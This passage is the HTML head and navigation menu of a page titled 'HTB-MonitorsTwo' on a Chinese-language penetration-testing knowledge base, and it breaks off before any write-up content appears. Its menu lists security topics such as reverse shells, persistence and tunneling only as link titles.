@@ -1,0 +1,3990 @@
+
+<!doctype html>
+<html lang="zh" class="no-js">
+  <head>
+    
+      <meta charset="utf-8">
+      <meta name="viewport" content="width=device-width,initial-scale=1">
+      
+      
+        <meta name="author" content="TimeLess613">
+      
+      
+      
+        <link rel="prev" href="../HTB-APT/">
+      
+      
+        <link rel="next" href="../HTB-Busqueda/">
+      
+      
+      <link rel="icon" href="../../../assets/images/favicon.png">
+      <meta name="generator" content="mkdocs-1.6.1, mkdocs-material-9.5.44">
+    
+    
+      
+        <title>HTB-MonitorsTwo - HacKnowledgeBase</title>
+      
+    
+    
+      <link rel="stylesheet" href="../../../assets/stylesheets/main.0253249f.min.css">
+      
+        
+        <link rel="stylesheet" href="../../../assets/stylesheets/palette.06af60db.min.css">
+      
+      
+
+
+    
+    
+      
+    
+    
+      
+        
+        
+        <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+        <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Noto+Sans:300,300i,400,400i,700,700i%7CSource+Code+Pro:400,400i,700,700i&display=fallback">
+        <style>:root{--md-text-font:"Noto Sans";--md-code-font:"Source Code Pro"}</style>
+      
+    
+    
+      <link rel="stylesheet" href="../../../static/css/extra.css">
+    
+    <script>__md_scope=new URL("../../..",location),__md_hash=e=>[...e].reduce(((e,_)=>(e<<5)-e+_.charCodeAt(0)),0),__md_get=(e,_=localStorage,t=__md_scope)=>JSON.parse(_.getItem(t.pathname+"."+e)),__md_set=(e,_,t=localStorage,a=__md_scope)=>{try{t.setItem(a.pathname+"."+e,JSON.stringify(_))}catch(e){}}</script>
+    
+      
+
+    
+    
+    
+   <link href="../../../assets/stylesheets/glightbox.min.css" rel="stylesheet"/><style>
+    html.glightbox-open { overflow: initial; height: 100%; }
+    .gslide-title { margin-top: 0px; user-select: text; }
+    .gslide-desc { color: #666; user-select: text; }
+    .gslide-image img { background: white; }
+    .gscrollbar-fixer { padding-right: 15px; }
+    .gdesc-inner { font-size: 0.75rem; }
+    body[data-md-color-scheme="slate"] .gdesc-inner { background: var(--md-default-bg-color);}
+    body[data-md-color-scheme="slate"] .gslide-title { color: var(--md-default-fg-color);}
+    body[data-md-color-scheme="slate"] .gslide-desc { color: var(--md-default-fg-color);}</style> <script src="../../../assets/javascripts/glightbox.min.js"></script></head>
+  
+  
+    
+    
+      
+    
+    
+    
+    
+    <body dir="ltr" data-md-color-scheme="default" data-md-color-primary="indigo" data-md-color-accent="indigo">
+  
+    
+    <input class="md-toggle" data-md-toggle="drawer" type="checkbox" id="__drawer" autocomplete="off">
+    <input class="md-toggle" data-md-toggle="search" type="checkbox" id="__search" autocomplete="off">
+    <label class="md-overlay" for="__drawer"></label>
+    <div data-md-component="skip">
+      
+        
+        <a href="#_1" class="md-skip">
+          跳转至
+        </a>
+      
+    </div>
+    <div data-md-component="announce">
+      
+    </div>
+    
+    
+      
+
+  
+
+<header class="md-header md-header--shadow md-header--lifted" data-md-component="header">
+  <nav class="md-header__inner md-grid" aria-label="页眉">
+    <a href="../../.." title="HacKnowledgeBase" class="md-header__button md-logo" aria-label="HacKnowledgeBase" data-md-component="logo">
+      
+  
+  <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 8a3 3 0 0 0 3-3 3 3 0 0 0-3-3 3 3 0 0 0-3 3 3 3 0 0 0 3 3m0 3.54C9.64 9.35 6.5 8 3 8v11c3.5 0 6.64 1.35 9 3.54 2.36-2.19 5.5-3.54 9-3.54V8c-3.5 0-6.64 1.35-9 3.54"/></svg>
+
+    </a>
+    <label class="md-header__button md-icon" for="__drawer">
+      
+      <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M3 6h18v2H3zm0 5h18v2H3zm0 5h18v2H3z"/></svg>
+    </label>
+    <div class="md-header__title" data-md-component="header-title">
+      <div class="md-header__ellipsis">
+        <div class="md-header__topic">
+          <span class="md-ellipsis">
+            HacKnowledgeBase
+          </span>
+        </div>
+        <div class="md-header__topic" data-md-component="header-topic">
+          <span class="md-ellipsis">
+            
+              HTB-MonitorsTwo
+            
+          </span>
+        </div>
+      </div>
+    </div>
+    
+      
+        <form class="md-header__option" data-md-component="palette">
+  
+    
+    
+    
+    <input class="md-option" data-md-color-media="(prefers-color-scheme)" data-md-color-scheme="default" data-md-color-primary="indigo" data-md-color-accent="indigo"  aria-label="Switch to light mode"  type="radio" name="__palette" id="__palette_0">
+    
+      <label class="md-header__button md-icon" title="Switch to light mode" for="__palette_1" hidden>
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="m14.3 16-.7-2h-3.2l-.7 2H7.8L11 7h2l3.2 9zM20 8.69V4h-4.69L12 .69 8.69 4H4v4.69L.69 12 4 15.31V20h4.69L12 23.31 15.31 20H20v-4.69L23.31 12zm-9.15 3.96h2.3L12 9z"/></svg>
+      </label>
+    
+  
+    
+    
+    
+    <input class="md-option" data-md-color-media="(prefers-color-scheme: light)" data-md-color-scheme="default" data-md-color-primary="cyan" data-md-color-accent="indigo"  aria-label="Switch to dark mode"  type="radio" name="__palette" id="__palette_1">
+    
+      <label class="md-header__button md-icon" title="Switch to dark mode" for="__palette_2" hidden>
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 8a4 4 0 0 0-4 4 4 4 0 0 0 4 4 4 4 0 0 0 4-4 4 4 0 0 0-4-4m0 10a6 6 0 0 1-6-6 6 6 0 0 1 6-6 6 6 0 0 1 6 6 6 6 0 0 1-6 6m8-9.31V4h-4.69L12 .69 8.69 4H4v4.69L.69 12 4 15.31V20h4.69L12 23.31 15.31 20H20v-4.69L23.31 12z"/></svg>
+      </label>
+    
+  
+    
+    
+    
+    <input class="md-option" data-md-color-media="(prefers-color-scheme: dark)" data-md-color-scheme="slate" data-md-color-primary="indigo" data-md-color-accent="blue"  aria-label="Switch to light mode"  type="radio" name="__palette" id="__palette_2">
+    
+      <label class="md-header__button md-icon" title="Switch to light mode" for="__palette_0" hidden>
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 18c-.89 0-1.74-.2-2.5-.55C11.56 16.5 13 14.42 13 12s-1.44-4.5-3.5-5.45C10.26 6.2 11.11 6 12 6a6 6 0 0 1 6 6 6 6 0 0 1-6 6m8-9.31V4h-4.69L12 .69 8.69 4H4v4.69L.69 12 4 15.31V20h4.69L12 23.31 15.31 20H20v-4.69L23.31 12z"/></svg>
+      </label>
+    
+  
+</form>
+      
+    
+    
+      <script>var palette=__md_get("__palette");if(palette&&palette.color){if("(prefers-color-scheme)"===palette.color.media){var media=matchMedia("(prefers-color-scheme: light)"),input=document.querySelector(media.matches?"[data-md-color-media='(prefers-color-scheme: light)']":"[data-md-color-media='(prefers-color-scheme: dark)']");palette.color.media=input.getAttribute("data-md-color-media"),palette.color.scheme=input.getAttribute("data-md-color-scheme"),palette.color.primary=input.getAttribute("data-md-color-primary"),palette.color.accent=input.getAttribute("data-md-color-accent")}for(var[key,value]of Object.entries(palette.color))document.body.setAttribute("data-md-color-"+key,value)}</script>
+    
+    
+    
+      <label class="md-header__button md-icon" for="__search">
+        
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M9.5 3A6.5 6.5 0 0 1 16 9.5c0 1.61-.59 3.09-1.56 4.23l.27.27h.79l5 5-1.5 1.5-5-5v-.79l-.27-.27A6.52 6.52 0 0 1 9.5 16 6.5 6.5 0 0 1 3 9.5 6.5 6.5 0 0 1 9.5 3m0 2C7 5 5 7 5 9.5S7 14 9.5 14 14 12 14 9.5 12 5 9.5 5"/></svg>
+      </label>
+      <div class="md-search" data-md-component="search" role="dialog">
+  <label class="md-search__overlay" for="__search"></label>
+  <div class="md-search__inner" role="search">
+    <form class="md-search__form" name="search">
+      <input type="text" class="md-search__input" name="query" aria-label="搜索" placeholder="搜索" autocapitalize="off" autocorrect="off" autocomplete="off" spellcheck="false" data-md-component="search-query" required>
+      <label class="md-search__icon md-icon" for="__search">
+        
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M9.5 3A6.5 6.5 0 0 1 16 9.5c0 1.61-.59 3.09-1.56 4.23l.27.27h.79l5 5-1.5 1.5-5-5v-.79l-.27-.27A6.52 6.52 0 0 1 9.5 16 6.5 6.5 0 0 1 3 9.5 6.5 6.5 0 0 1 9.5 3m0 2C7 5 5 7 5 9.5S7 14 9.5 14 14 12 14 9.5 12 5 9.5 5"/></svg>
+        
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M20 11v2H8l5.5 5.5-1.42 1.42L4.16 12l7.92-7.92L13.5 5.5 8 11z"/></svg>
+      </label>
+      <nav class="md-search__options" aria-label="查找">
+        
+          <a href="javascript:void(0)" class="md-search__icon md-icon" title="分享" aria-label="分享" data-clipboard data-clipboard-text="" data-md-component="search-share" tabindex="-1">
+            
+            <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M18 16.08c-.76 0-1.44.3-1.96.77L8.91 12.7c.05-.23.09-.46.09-.7s-.04-.47-.09-.7l7.05-4.11c.54.5 1.25.81 2.04.81a3 3 0 0 0 3-3 3 3 0 0 0-3-3 3 3 0 0 0-3 3c0 .24.04.47.09.7L8.04 9.81C7.5 9.31 6.79 9 6 9a3 3 0 0 0-3 3 3 3 0 0 0 3 3c.79 0 1.5-.31 2.04-.81l7.12 4.15c-.05.21-.08.43-.08.66 0 1.61 1.31 2.91 2.92 2.91s2.92-1.3 2.92-2.91A2.92 2.92 0 0 0 18 16.08"/></svg>
+          </a>
+        
+        <button type="reset" class="md-search__icon md-icon" title="清空当前内容" aria-label="清空当前内容" tabindex="-1">
+          
+          <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M19 6.41 17.59 5 12 10.59 6.41 5 5 6.41 10.59 12 5 17.59 6.41 19 12 13.41 17.59 19 19 17.59 13.41 12z"/></svg>
+        </button>
+      </nav>
+      
+        <div class="md-search__suggest" data-md-component="search-suggest"></div>
+      
+    </form>
+    <div class="md-search__output">
+      <div class="md-search__scrollwrap" tabindex="0" data-md-scrollfix>
+        <div class="md-search-result" data-md-component="search-result">
+          <div class="md-search-result__meta">
+            正在初始化搜索引擎
+          </div>
+          <ol class="md-search-result__list" role="presentation"></ol>
+        </div>
+      </div>
+    </div>
+  </div>
+</div>
+    
+    
+      <div class="md-header__source">
+        <a href="https://github.com/TimeLess613/kiwi" title="前往仓库" class="md-source" data-md-component="source">
+  <div class="md-source__icon md-icon">
+    
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 480 512"><!--! Font Awesome Free 6.6.0 by @fontawesome - https://fontawesome.com License - https://fontawesome.com/license/free (Icons: CC BY 4.0, Fonts: SIL OFL 1.1, Code: MIT License) Copyright 2024 Fonticons, Inc.--><path d="M186.1 328.7c0 20.9-10.9 55.1-36.7 55.1s-36.7-34.2-36.7-55.1 10.9-55.1 36.7-55.1 36.7 34.2 36.7 55.1M480 278.2c0 31.9-3.2 65.7-17.5 95-37.9 76.6-142.1 74.8-216.7 74.8-75.8 0-186.2 2.7-225.6-74.8-14.6-29-20.2-63.1-20.2-95 0-41.9 13.9-81.5 41.5-113.6-5.2-15.8-7.7-32.4-7.7-48.8 0-21.5 4.9-32.3 14.6-51.8 45.3 0 74.3 9 108.8 36 29-6.9 58.8-10 88.7-10 27 0 54.2 2.9 80.4 9.2 34-26.7 63-35.2 107.8-35.2 9.8 19.5 14.6 30.3 14.6 51.8 0 16.4-2.6 32.7-7.7 48.2 27.5 32.4 39 72.3 39 114.2m-64.3 50.5c0-43.9-26.7-82.6-73.5-82.6-18.9 0-37 3.4-56 6-14.9 2.3-29.8 3.2-45.1 3.2-15.2 0-30.1-.9-45.1-3.2-18.7-2.6-37-6-56-6-46.8 0-73.5 38.7-73.5 82.6 0 87.8 80.4 101.3 150.4 101.3h48.2c70.3 0 150.6-13.4 150.6-101.3m-82.6-55.1c-25.8 0-36.7 34.2-36.7 55.1s10.9 55.1 36.7 55.1 36.7-34.2 36.7-55.1-10.9-55.1-36.7-55.1"/></svg>
+  </div>
+  <div class="md-source__repository">
+    TimeLess613/kiwi
+  </div>
+</a>
+      </div>
+    
+  </nav>
+  
+    
+      
+<nav class="md-tabs" aria-label="标签" data-md-component="tabs">
+  <div class="md-grid">
+    <ul class="md-tabs__list">
+      
+        
+  
+  
+  
+    
+    
+      <li class="md-tabs__item">
+        <a href="../../.." class="md-tabs__link">
+          
+  
+  Home
+
+        </a>
+      </li>
+    
+  
+
+      
+        
+  
+  
+  
+    <li class="md-tabs__item">
+      <a href="../../../basic-concepts/basic-concepts/" class="md-tabs__link">
+        
+  
+    
+  
+  基础概念
+
+      </a>
+    </li>
+  
+
+      
+        
+  
+  
+  
+    
+    
+      <li class="md-tabs__item">
+        <a href="../../../information-gathering/information-gathering/" class="md-tabs__link">
+          
+  
+  信息收集
+
+        </a>
+      </li>
+    
+  
+
+      
+        
+  
+  
+  
+    
+    
+      <li class="md-tabs__item">
+        <a href="../../../initial-access/initial-access/" class="md-tabs__link">
+          
+  
+  初始访问
+
+        </a>
+      </li>
+    
+  
+
+      
+        
+  
+  
+  
+    
+    
+      <li class="md-tabs__item">
+        <a href="../../../privilege-escalation/privilege-escalation/" class="md-tabs__link">
+          
+  
+  提权
+
+        </a>
+      </li>
+    
+  
+
+      
+        
+  
+  
+  
+    
+    
+      <li class="md-tabs__item">
+        <a href="../../../post-exploitation/Persistence/" class="md-tabs__link">
+          
+  
+  后渗透
+
+        </a>
+      </li>
+    
+  
+
+      
+        
+  
+  
+  
+    
+    
+      <li class="md-tabs__item">
+        <a href="../../../arsenal/nmap/" class="md-tabs__link">
+          
+  
+  武器库
+
+        </a>
+      </li>
+    
+  
+
+      
+        
+  
+  
+  
+    
+    
+      <li class="md-tabs__item">
+        <a href="../../../Resources/simple-network-service/" class="md-tabs__link">
+          
+  
+  Resources
+
+        </a>
+      </li>
+    
+  
+
+      
+        
+  
+  
+  
+    
+    
+      
+  
+  
+  
+    
+    
+      <li class="md-tabs__item">
+        <a href="../../../BlueTeam/Splunk/SPL%20memo/" class="md-tabs__link">
+          
+  
+  BlueTeam
+
+        </a>
+      </li>
+    
+  
+
+    
+  
+
+      
+        
+  
+  
+    
+  
+  
+    
+    
+      <li class="md-tabs__item md-tabs__item--active">
+        <a href="../../active/writeup-template/" class="md-tabs__link">
+          
+  
+  靶机WriteUp
+
+        </a>
+      </li>
+    
+  
+
+      
+    </ul>
+  </div>
+</nav>
+    
+  
+</header>
+    
+    <div class="md-container" data-md-component="container">
+      
+      
+        
+      
+      <main class="md-main" data-md-component="main">
+        <div class="md-main__inner md-grid">
+          
+            
+              
+              <div class="md-sidebar md-sidebar--primary" data-md-component="sidebar" data-md-type="navigation" >
+                <div class="md-sidebar__scrollwrap">
+                  <div class="md-sidebar__inner">
+                    
+
+
+  
+
+
+<nav class="md-nav md-nav--primary md-nav--lifted" aria-label="导航栏" data-md-level="0">
+  <label class="md-nav__title" for="__drawer">
+    <a href="../../.." title="HacKnowledgeBase" class="md-nav__button md-logo" aria-label="HacKnowledgeBase" data-md-component="logo">
+      
+  
+  <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 8a3 3 0 0 0 3-3 3 3 0 0 0-3-3 3 3 0 0 0-3 3 3 3 0 0 0 3 3m0 3.54C9.64 9.35 6.5 8 3 8v11c3.5 0 6.64 1.35 9 3.54 2.36-2.19 5.5-3.54 9-3.54V8c-3.5 0-6.64 1.35-9 3.54"/></svg>
+
+    </a>
+    HacKnowledgeBase
+  </label>
+  
+    <div class="md-nav__source">
+      <a href="https://github.com/TimeLess613/kiwi" title="前往仓库" class="md-source" data-md-component="source">
+  <div class="md-source__icon md-icon">
+    
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 480 512"><!--! Font Awesome Free 6.6.0 by @fontawesome - https://fontawesome.com License - https://fontawesome.com/license/free (Icons: CC BY 4.0, Fonts: SIL OFL 1.1, Code: MIT License) Copyright 2024 Fonticons, Inc.--><path d="M186.1 328.7c0 20.9-10.9 55.1-36.7 55.1s-36.7-34.2-36.7-55.1 10.9-55.1 36.7-55.1 36.7 34.2 36.7 55.1M480 278.2c0 31.9-3.2 65.7-17.5 95-37.9 76.6-142.1 74.8-216.7 74.8-75.8 0-186.2 2.7-225.6-74.8-14.6-29-20.2-63.1-20.2-95 0-41.9 13.9-81.5 41.5-113.6-5.2-15.8-7.7-32.4-7.7-48.8 0-21.5 4.9-32.3 14.6-51.8 45.3 0 74.3 9 108.8 36 29-6.9 58.8-10 88.7-10 27 0 54.2 2.9 80.4 9.2 34-26.7 63-35.2 107.8-35.2 9.8 19.5 14.6 30.3 14.6 51.8 0 16.4-2.6 32.7-7.7 48.2 27.5 32.4 39 72.3 39 114.2m-64.3 50.5c0-43.9-26.7-82.6-73.5-82.6-18.9 0-37 3.4-56 6-14.9 2.3-29.8 3.2-45.1 3.2-15.2 0-30.1-.9-45.1-3.2-18.7-2.6-37-6-56-6-46.8 0-73.5 38.7-73.5 82.6 0 87.8 80.4 101.3 150.4 101.3h48.2c70.3 0 150.6-13.4 150.6-101.3m-82.6-55.1c-25.8 0-36.7 34.2-36.7 55.1s10.9 55.1 36.7 55.1 36.7-34.2 36.7-55.1-10.9-55.1-36.7-55.1"/></svg>
+  </div>
+  <div class="md-source__repository">
+    TimeLess613/kiwi
+  </div>
+</a>
+    </div>
+  
+  <ul class="md-nav__list" data-md-scrollfix>
+    
+      
+      
+  
+  
+  
+  
+    
+    
+    
+      
+      
+    
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+        
+        
+          
+        
+        <input class="md-nav__toggle md-toggle md-toggle--indeterminate" type="checkbox" id="__nav_1" >
+        
+          
+          <label class="md-nav__link" for="__nav_1" id="__nav_1_label" tabindex="0">
+            
+  
+  <span class="md-ellipsis">
+    Home
+  </span>
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_1_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_1">
+            <span class="md-nav__icon md-icon"></span>
+            Home
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../.." class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    主页
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../tool-links/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Tool Links
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../material-color-palette/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    配色变更
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../basic-concepts/basic-concepts/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    基础概念
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+  
+    
+    
+    
+      
+      
+    
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+        
+        
+          
+        
+        <input class="md-nav__toggle md-toggle md-toggle--indeterminate" type="checkbox" id="__nav_3" >
+        
+          
+          <label class="md-nav__link" for="__nav_3" id="__nav_3_label" tabindex="0">
+            
+  
+  <span class="md-ellipsis">
+    信息收集
+  </span>
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_3_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_3">
+            <span class="md-nav__icon md-icon"></span>
+            信息收集
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../information-gathering/information-gathering/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    简介
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../information-gathering/footprinting/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    踩点
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../information-gathering/scanning/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    扫描
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../information-gathering/enumerate/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    枚举
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../information-gathering/summary/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    思路
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+  
+    
+    
+    
+      
+      
+    
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+        
+        
+          
+        
+        <input class="md-nav__toggle md-toggle md-toggle--indeterminate" type="checkbox" id="__nav_4" >
+        
+          
+          <label class="md-nav__link" for="__nav_4" id="__nav_4_label" tabindex="0">
+            
+  
+  <span class="md-ellipsis">
+    初始访问
+  </span>
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_4_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_4">
+            <span class="md-nav__icon md-icon"></span>
+            初始访问
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../initial-access/initial-access/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    简介
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../initial-access/web/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    WEB
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../initial-access/%E5%8F%8D%E5%BC%B9shell/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    反弹shell
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+  
+    
+    
+    
+      
+      
+    
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+        
+        
+          
+        
+        <input class="md-nav__toggle md-toggle md-toggle--indeterminate" type="checkbox" id="__nav_5" >
+        
+          
+          <label class="md-nav__link" for="__nav_5" id="__nav_5_label" tabindex="0">
+            
+  
+  <span class="md-ellipsis">
+    提权
+  </span>
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_5_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_5">
+            <span class="md-nav__icon md-icon"></span>
+            提权
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../privilege-escalation/privilege-escalation/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    简介
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../privilege-escalation/waiting/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Linux
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../privilege-escalation/waiting/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Linux
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+  
+    
+    
+    
+      
+      
+    
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+        
+        
+          
+        
+        <input class="md-nav__toggle md-toggle md-toggle--indeterminate" type="checkbox" id="__nav_6" >
+        
+          
+          <label class="md-nav__link" for="__nav_6" id="__nav_6_label" tabindex="0">
+            
+  
+  <span class="md-ellipsis">
+    后渗透
+  </span>
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_6_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_6">
+            <span class="md-nav__icon md-icon"></span>
+            后渗透
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../post-exploitation/Persistence/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    权限维持
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../post-exploitation/ClearingTracks/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    痕迹清理
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    
+    
+    
+      
+      
+    
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+        
+        
+          
+        
+        <input class="md-nav__toggle md-toggle md-toggle--indeterminate" type="checkbox" id="__nav_6_3" >
+        
+          
+          <label class="md-nav__link" for="__nav_6_3" id="__nav_6_3_label" tabindex="0">
+            
+  
+  <span class="md-ellipsis">
+    Tunneling
+  </span>
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="2" aria-labelledby="__nav_6_3_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_6_3">
+            <span class="md-nav__icon md-icon"></span>
+            Tunneling
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../post-exploitation/tunneling/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Tunneling
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../post-exploitation/SSH%20Tunneling/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    SSH Tunneling
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    
+    
+    
+      
+      
+    
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+        
+        
+          
+        
+        <input class="md-nav__toggle md-toggle md-toggle--indeterminate" type="checkbox" id="__nav_6_4" >
+        
+          
+          <label class="md-nav__link" for="__nav_6_4" id="__nav_6_4_label" tabindex="0">
+            
+  
+  <span class="md-ellipsis">
+    File Transfers
+  </span>
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="2" aria-labelledby="__nav_6_4_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_6_4">
+            <span class="md-nav__icon md-icon"></span>
+            File Transfers
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../post-exploitation/FileTransfers-Linux/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Linux
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../post-exploitation/FileTransfers-Windows/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    WIndows
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+  
+    
+    
+    
+      
+      
+    
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+        
+        
+          
+        
+        <input class="md-nav__toggle md-toggle md-toggle--indeterminate" type="checkbox" id="__nav_7" >
+        
+          
+          <label class="md-nav__link" for="__nav_7" id="__nav_7_label" tabindex="0">
+            
+  
+  <span class="md-ellipsis">
+    武器库
+  </span>
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_7_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_7">
+            <span class="md-nav__icon md-icon"></span>
+            武器库
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../arsenal/nmap/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    nmap
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../arsenal/Netcat/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Netcat
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
